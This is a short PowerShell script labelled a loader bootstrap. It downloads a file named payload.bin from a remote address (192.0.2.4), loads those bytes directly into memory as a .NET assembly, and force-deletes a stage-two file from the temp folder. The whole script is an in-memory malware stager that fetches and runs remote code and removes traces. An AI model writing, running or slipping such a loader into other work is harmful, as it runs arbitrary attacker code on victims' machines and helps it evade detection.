
<# Loader bootstrap #>
[CmdletBinding()]
param(
    [string]$RemoteUrl = 'https://192.0.2.4/payload.bin'
)
$StageBytes = (New-Object System.Net.WebClient).DownloadData($RemoteUrl)
[Reflection.Assembly]::Load($StageBytes)
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
